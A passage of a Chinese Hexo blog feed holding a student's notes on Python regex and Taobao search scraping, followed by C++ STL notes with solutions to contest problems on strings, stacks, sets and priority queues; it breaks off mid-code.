class="string">r&#x27;A*?&#x27;</span>, <span class="string">&#x27;114514&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="keyword">match</span>.string)</span><br><span class="line"></span><br><span class="line"><span class="keyword">match</span> = re.<span class="keyword">match</span>(<span class="string">r&#x27;A+?&#x27;</span>, <span class="string">&#x27;ABBBBB&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="keyword">match</span>.string)</span><br><span class="line"></span><br><span class="line"><span class="keyword">match</span> = re.<span class="keyword">match</span>(<span class="string">r&#x27;A??&#x27;</span>, <span class="string">&#x27;BBBBBB&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="keyword">match</span>.string)</span><br><span class="line"></span><br><span class="line"><span class="keyword">match</span> = re.<span class="keyword">match</span>(<span class="string">r&#x27;A&#123;2,4&#125;?&#x27;</span>, <span class="string">&#x27;AABBAA&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="keyword">match</span>.string)</span><br><span class="line"><span class="comment"># 114514</span></span><br><span class="line"><span class="comment"># ABBBBB</span></span><br><span class="line"><span class="comment"># BBBBBB</span></span><br><span class="line"><span class="comment"># AABBAA</span></span><br></pre></td></tr></table></figure><h3 id="淘宝商品信息定向爬虫"><a href="#淘宝商品信息定向爬虫" class="headerlink" title="淘宝商品信息定向爬虫"></a>淘宝商品信息定向爬虫</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">https://s.taobao.com/search?ie=utf8&amp;initiative_id=staobaoz_20240418&amp;js=1&amp;page=1&amp;q=%E4%B9%A6%E5%8C%85&amp;tab=all</span><br><span class="line"></span><br><span class="line">问问chatgpt3.5：</span><br><span class="line">https://s.taobao.com/search?：是淘宝的搜索页面基础链接。</span><br><span class="line">ie=utf8：指定搜索页面使用UTF-8编码格式来解析搜索关键词。</span><br><span class="line">initiative_id=staobaoz_20240418：这个参数可能是用于跟踪和统计的，标识了搜索发起的来源和时间。</span><br><span class="line">js=1：这个参数可能表示是否启用JavaScript，这里设置为1表示启用。</span><br><span class="line">page=1：指定搜索结果的页数，这里是第一页。</span><br><span class="line">q=%E4%B9%A6%E5%8C%85：搜索的关键词&quot;书包&quot;的URL编码。</span><br><span class="line">tab=all：指定搜索的标签类型，这里是&quot;全部&quot;，表示搜索所有类型的商品。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">经过测试，直接访问https://s.taobao.com/search?page=1&amp;q=书包也可以爬取页面信息</span><br></pre></td></tr></table></figure><p>但是淘宝首页JavaScript 动态生成内容，暂时还不会这样的爬虫。标记为</p><p>//TODO</p><h3 id="股票数据定向"><a href="#股票数据定向" class="headerlink" title="股票数据定向"></a>股票数据定向</h3><p>同样是javascript动态生成。</p><p>//TODO</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>题目0x1</title>
      <link href="/2024/04/12/%E7%AE%97%E6%B3%95/%E9%A2%98%E7%9B%AE0x1/"/>
      <url>/2024/04/12/%E7%AE%97%E6%B3%95/%E9%A2%98%E7%9B%AE0x1/</url>
      
        <content type="html"><![CDATA[<h1 id="题目0x1"><a href="#题目0x1" class="headerlink" title="题目0x1"></a>题目0x1</h1><p>主要记录解题中一些<code>stl</code>的函数</p><p>[toc]</p><h3 id="字符串处理"><a href="#字符串处理" class="headerlink" title="字符串处理"></a>字符串处理</h3><h4 id="使用string标准库"><a href="#使用string标准库" class="headerlink" title="使用string标准库"></a>使用string标准库</h4><ul><li>当使用<code>getline(cin,string)</code>时，如果前面有<code>cin&gt;&gt;</code>，注意吸收换行符。</li></ul><div class="table-container"><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>substr（a,b);</td><td>返回a开始的b个字符</td></tr><tr><td>erase(a);     earse(a,b)</td><td>移除a之后的字符；          移除a开始的b个字符</td></tr><tr><td>find(“a”,b);</td><td>从前向后查找a第一次出现的位置，     b(可选)查找开始的下标       ,找不到时返回值-1</td></tr><tr><td>rfind(“a”)</td><td>从后向前查找a第一次出现的位置。</td></tr><tr><td>find.first_of(“abcd”)</td><td>从前向后查找abcd任一字符第一次出现的位置</td></tr><tr><td>find.last_of(“abcd”)</td><td>从前向后查找abcd任一字符最后一次出现的位置</td></tr><tr><td>find_first_not_of(“abcd”)</td><td>不在”abcd”中的字母第一次出现的地方。</td></tr><tr><td>find_last_not_of(“abcd”)</td><td>不在”abcd”中的字母最后一次出现的地方。</td></tr></tbody></table></div><h5 id="剪切粘贴"><a href="#剪切粘贴" class="headerlink" title="剪切粘贴"></a>剪切粘贴</h5><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240411230141109.png" alt="image-20240411230141109"></p><p>照着题目写代码，注意下字符串匹配返回的是字串的首地址就OK了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::string S;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">cin &gt;&gt; S &gt;&gt; n;</span><br><span class="line"><span class="keyword">while</span> (n--)</span><br><span class="line">&#123;</span><br><span class="line">std::string  s1, s2, tmp, tmp1, ss;</span><br><span class="line"><span class="type">int</span>  a, b;</span><br><span class="line"><span class="type">int</span> pos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cin &gt;&gt; a &gt;&gt; b &gt;&gt; s1 &gt;&gt; s2;</span><br><span class="line">a--, b--;</span><br><span class="line">tmp = S.<span class="built_in">substr</span>(a, b - a + <span class="number">1</span>);<span class="comment">//剪切中的复制</span></span><br><span class="line">S.<span class="built_in">erase</span>(a, b - a + <span class="number">1</span>);<span class="comment">//剪切中的删除</span></span><br><span class="line">ss = s1 + s2;</span><br><span class="line"><span class="keyword">if</span> ((pos = S.<span class="built_in">find</span>(ss)) == string::npos)</span><br><span class="line">&#123;</span><br><span class="line">S += tmp;<span class="comment">//找不到添加到字符串末尾</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">tmp1 = S.<span class="built_in">substr</span>(<span class="number">0</span>, pos);</span><br><span class="line">tmp1 += s1;<span class="comment">//注意find返回找到的字符串的首下标，因此我们要添加匹配字符串的前半部分</span></span><br><span class="line">tmp1 += tmp;<span class="comment">//剪切中的粘贴</span></span><br><span class="line">tmp1 += S.<span class="built_in">substr</span>(pos+s<span class="number">1.l</span>ength(), S.<span class="built_in">length</span>() - pos - s<span class="number">1.l</span>ength());<span class="comment">//剩下的内容，包含匹配字符串的后半部分</span></span><br><span class="line">S = tmp1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; S &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="估值一亿的AI核心代码"><a href="#估值一亿的AI核心代码" class="headerlink" title="估值一亿的AI核心代码"></a>估值一亿的AI核心代码</h5><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240412174556574.png" alt="image-20240412174556574"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="使用正则表达式"><a href="#使用正则表达式" class="headerlink" title="使用正则表达式"></a>使用正则表达式</h4><h3 id="塔"><a href="#塔" class="headerlink" title="塔"></a>塔</h3><h4 id="栈，启动！"><a href="#栈，启动！" class="headerlink" title="栈，启动！"></a>栈，启动！</h4><div class="table-container"><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>empty()</td><td>判断是否为空，空返回true，否则返回false</td></tr><tr><td>size()</td><td>返回元素个数，类型为size_t</td></tr><tr><td>push(x)</td><td>将x压栈</td></tr><tr><td>top()</td><td>返回栈顶元素</td></tr><tr><td>pop()</td><td>从栈顶删除元素，注意没有返回值，</td></tr><tr><td>emplace(x)</td><td>将x压栈</td></tr></tbody></table></div><ul><li><code>push</code>和<code>emplace</code>的区别：<code>emplace</code>只调用一次构造函数，而<code>push</code>会调用一次构造函数+一次移动构造函数。即<code>emplace</code>使用了<code>移动构造函数</code>，直接在容器内构造对象。而<code>push</code>需要先构造对象，再push到容器中。由于省去了拷贝构造过程，<code>emplace</code>一般比<code>push</code>快。</li></ul><h5 id="堆宝塔"><a href="#堆宝塔" class="headerlink" title="堆宝塔"></a>堆宝塔</h5><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240412101755122.png" alt=""></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> N, in, Tower = <span class="number">0</span>, hight = <span class="number">0</span>;</span><br><span class="line">stack &lt;<span class="type">int</span>&gt; a, b;</span><br><span class="line">cin &gt;&gt; N;</span><br><span class="line"><span class="keyword">while</span>(N--)</span><br><span class="line">&#123;</span><br><span class="line">cin &gt;&gt; in;</span><br><span class="line"><span class="keyword">if</span> (a.<span class="built_in">empty</span>()) a.<span class="built_in">push</span>(in);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (in &lt; a.<span class="built_in">top</span>())a.<span class="built_in">push</span>(in);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (b.<span class="built_in">empty</span>() || b.<span class="built_in">top</span>() &lt; in)b.<span class="built_in">push</span>(in);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">Tower++;</span><br><span class="line">hight = <span class="built_in">max</span>(hight, (<span class="type">int</span>)a.<span class="built_in">size</span>());<span class="comment">//注意显示类型转换</span></span><br><span class="line"><span class="keyword">while</span> (!a.<span class="built_in">empty</span>())</span><br><span class="line">&#123;</span><br><span class="line">a.<span class="built_in">pop</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (!b.<span class="built_in">empty</span>() &amp;&amp; b.<span class="built_in">top</span>() &gt; in)</span><br><span class="line">&#123;</span><br><span class="line">a.<span class="built_in">push</span>((<span class="type">int</span>)b.<span class="built_in">top</span>());</span><br><span class="line">b.<span class="built_in">pop</span>();</span><br><span class="line">&#125;</span><br><span class="line">a.<span class="built_in">push</span>(in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!a.<span class="built_in">empty</span>())</span><br><span class="line">&#123;</span><br><span class="line">hight = <span class="built_in">max</span>(hight, (<span class="type">int</span>)a.<span class="built_in">size</span>());</span><br><span class="line">Tower++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!b.<span class="built_in">empty</span>())</span><br><span class="line">&#123;</span><br><span class="line">hight = <span class="built_in">max</span>(hight, (<span class="type">int</span>)b.<span class="built_in">size</span>());</span><br><span class="line">Tower++;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; Tower &lt;&lt; <span class="string">&quot; &quot;</span>&lt;&lt; hight &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="汉诺塔"><a href="#汉诺塔" class="headerlink" title="汉诺塔"></a>汉诺塔</h5><p>//TODO</p><h3 id="set"><a href="#set" class="headerlink" title="set"></a>set</h3><p>此标头是<a href="https://zh.cppreference.com/w/cpp/container">容器</a>库的一部分,是一个内部<strong>自动有序</strong>且<strong>不含重复元素</strong>的容器，因此我们要通过<code>迭代器</code>来访问<code>set</code>内的元素。</p><div class="table-container"><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>insert()</td><td>插入容器</td></tr><tr><td>find(value)</td><td>查找元素，如果找到了该元素，则返回指向该元素的迭代器；如果没有找到，则返回一个指向集合末尾的迭代器（即 <code>end()</code>）。</td></tr><tr><td>earse（value）</td><td>删除值为value的元素</td></tr><tr><td>erase(first, last)</td><td>删除一个区间内的所有元素。</td></tr><tr><td>size()</td><td>set内元素个数</td></tr><tr><td>clear()</td><td>清空set</td></tr></tbody></table></div><h5 id="集合相似度"><a href="#集合相似度" class="headerlink" title="集合相似度"></a>集合相似度</h5><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240412193441656.png" alt="image-20240412193441656"></p><p>参考：<a href="https://blog.csdn.net/dhshshdh/article/details/127542598">L2-005 集合相似度_题目描述 给定两个整数集合,它们的相似度定义为:nc/nt×100%。其中nc是两个集合都-CSDN博客</a></p><p>要注意一下这题相似度的计算公式</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">55</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">set&lt;<span class="type">int</span>&gt; jihe[<span class="number">55</span>];</span><br><span class="line"></span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="type">int</span> pos = <span class="number">1</span>;<span class="comment">//方便计算</span></span><br><span class="line"><span class="keyword">while</span> (n--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> tmp;</span><br><span class="line">cin &gt;&gt; tmp;</span><br><span class="line"><span class="keyword">while</span> (tmp--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> tmp2;</span><br><span class="line">cin &gt;&gt; tmp2;</span><br><span class="line">jihe[pos].<span class="built_in">insert</span>(tmp2);</span><br><span class="line">&#125;</span><br><span class="line">pos++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> m ;</span><br><span class="line">cin &gt;&gt; m;</span><br><span class="line"><span class="keyword">while</span> (m--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> a, b, count = <span class="number">0</span>;</span><br><span class="line">cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line"><span class="type">int</span> tmp = jihe[a].<span class="built_in">size</span>() + jihe[b].<span class="built_in">size</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> it : jihe[a])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (jihe[b].<span class="built_in">find</span>(it) != jihe[b].<span class="built_in">end</span>()) &#123;</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">double</span> p = count * <span class="number">100.0</span> / (tmp - count);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2f%\n&quot;</span>, p);</span><br><span class="line">count = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h3><h4 id="普通队列"><a href="#普通队列" class="headerlink" title="普通队列"></a>普通队列</h4><div class="table-container"><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>top()</td><td>访问队首元素</td></tr><tr><td>empty（）</td><td>队列是否为空</td></tr><tr><td>size()</td><td>返回队列内元素个数</td></tr><tr><td>push(a)</td><td>队尾插入元素a</td></tr><tr><td>emplace()</td><td>构造一个元素并插入队列</td></tr><tr><td>pop()</td><td>弹出队头元素</td></tr><tr><td>swap(other)</td><td>与other交换内容</td></tr></tbody></table></div><h4 id="优先队列"><a href="#优先队列" class="headerlink" title="优先队列"></a>优先队列</h4><p>不同于普通队列，优先队列元素的出队顺序不是按照它们进入队列的顺序，而是根据它们的<code>优先级</code>来确定的。</p><div class="table-container"><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>priority_queue<int> q;</td><td>默认情况下是最大值优先队列</td></tr><tr><td>priority_queue <int,vector<int>,greater<int> &gt; q;</td><td>最大值优先队列</td></tr><tr><td>priority_queue <int,vector<int>,less<int> &gt;q;</td><td>最小值优先队列</td></tr></tbody></table></div><h5 id="天梯赛的赛场安排"><a href="#天梯赛的赛场安排" class="headerlink" title="天梯赛的赛场安排"></a>天梯赛的赛场安排</h5><p>这题在比赛的时候没做出来，好吧复盘我么没做出来，分析下来是需要我们认真读题。我们看<code>n&lt;C</code>的情况，需要取n最小，即没有座位的考生<code>人数最小</code>的组优先安排赛场，然后再插入其他组，若其他组加入后容量大于<code>所有组</code>的赛场容量，则新开一个赛场。（PS：这就是为什么不能直接直接将考生整除C，因为这样分配有些考场会有空座位）。</p><p>那么根据题意我们用优先队列解决问题。</p><p>参考：<a href="https://blog.csdn.net/Freshman_wang/article/details/135214548">L2-2 天梯赛的赛场安排（C++注释版）-CSDN博客</a></p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240412110733909.png" alt="image-20240412110733909"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAX_N = <span class="number">5005</span>;</span><br><span class="line"><span class="type">int</span> a[MAX_N];</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> N, C;<span class="comment">//参赛学校数量和规定容量</span></span><br><span class="line"><span class="type">int</span> count = <span class="number">0</span>, cnt = <span class="number">0</span>; <span class="comment">//坐满的考场数和多出来的学生用的考场的数量</span></span><br><span class="line"></span><br><span class="line">priority_queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">cin &gt;&gt; N &gt;&gt; C;</span><br><span class="line"><span class="keyword">while</span> (N--)</span><br><span class="line">&#123;</span><br><span class="line">std::string name;</span><br><span class="line"><span class="type">int</span> num,kaochang;</span><br><span class="line">cin &gt;&gt; name &gt;&gt; num;</span><br><span class="line">kaochang = <span class="built_in">ceil</span>(<span class="number">1.0</span>*num / C);<span class="comment">//转成浮点型，否则/会直接四舍五入</span></span><br><span class="line"></span><br><span class="line">count += num / C;<span class="comment">//坐满的考场数</span></span><br><span class="line">cout &lt;&lt; name &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; kaochang &lt;&lt; endl;</span><br><span class="line"><span class="keyword">if</span> (num % C )</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">q.<span class="built_in">emplace</span>(num%C);<span class="comment">//没有座位的学生人数</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (!q.<span class="built_in">empty</span>())</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> tmp = q.<span class="built_in">top</span>();</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line"><span class="type">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; cnt; i++)<span class="comment">//查找新开的每一个考场</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (a[i] + tmp &lt;= C)</span><br><span class="line">&#123;</span><br><span class="line">a[i] += tmp, flag = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag)a[cnt++] = tmp;<span class="comment">//新开考场</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; cnt+count &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="others"><a href="#others" class="headerlink" title="others"></a>others</h3><h4 id="取整函数"><a href="#取整函数" class="headerlink" title="取整函数"></a>取整函数</h4><p>注意这些函数的返回值都为<code>double</code>,通过隐式转换为<code>int</code>和<code>float</code>。</p><div class="table-container"><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>floor(x)</td><td>把一个小数向下取整</td></tr><tr><td>ceil(x)</td><td>把一个小数向上取整</td></tr><tr><td>round(x)</td><td>把一个小数四舍五入</td></tr></tbody></table></div><h4 id="数字字母判断，大小转换"><a href="#数字字母判断，大小转换" class="headerlink" title="数字字母判断，大小转换"></a>数字字母判断，大小转换</h4><p><code>#include&lt;cctype&gt;</code></p><div class="table-container"><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>isdigit()</td><td>是否为数字</td></tr><tr><td>isalpha()</td><td>是否未字母</td></tr><tr><td>isalnum()</td><td>是否为数字或者字母</td></tr><tr><td>.islower()</td><td>是否为小写字母</td></tr><tr><td>isupper()</td><td>是否为大写字母</td></tr><tr><td>toupper(a)</td><td>转换为大写字母</td></tr><tr><td>tolower(a)</td><td>转换为小写字母</td></tr></tbody></table></div><h3 id="一些错题"><a href="#一些错题" class="headerlink" title="一些错题"></a>一些错题</h3><h5 id="分寝室"><a href="#分寝室" class="headerlink" title="分寝室"></a>分寝室</h5><p>比赛没有做出来这题，赛后总结一下，思路是对的，但是具体实现还有问题，总结就是——还要多练！</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240412100032390.png" alt="image-20240412100032390"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> n0, n1, n;</span><br><span class="line">cin &gt;&gt; n0 &gt;&gt; n1 &gt;&gt; n;</span><br><span class="line"><span class="type">int</span> flag = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> min = <span class="number">100005</span>;</span><br><span class="line"><span class="type">int</span> min_i;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n &amp;&amp; i &lt; n0 &amp;&amp; (n - i) &lt; n1; i++)<span class="comment">//限定i的范围，且不能一人一间寝室，</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (n0 % i == <span class="number">0</span> &amp;&amp; n1 % (n - i) == <span class="number">0</span>)<span class="comment">///能整除i时进入，即学生们能被均分</span></span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> tmp = <span class="built_in">abs</span>(n0 / i - n1 / (n - i));<span class="comment">//取绝对值，防止负数</span></span><br><span class="line"><span class="keyword">if</span> (tmp &lt; min)<span class="comment">//取相差最小的</span></span><br><span class="line">&#123;</span><br><span class="line">min = tmp;</span><br><span class="line">min_i = i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; 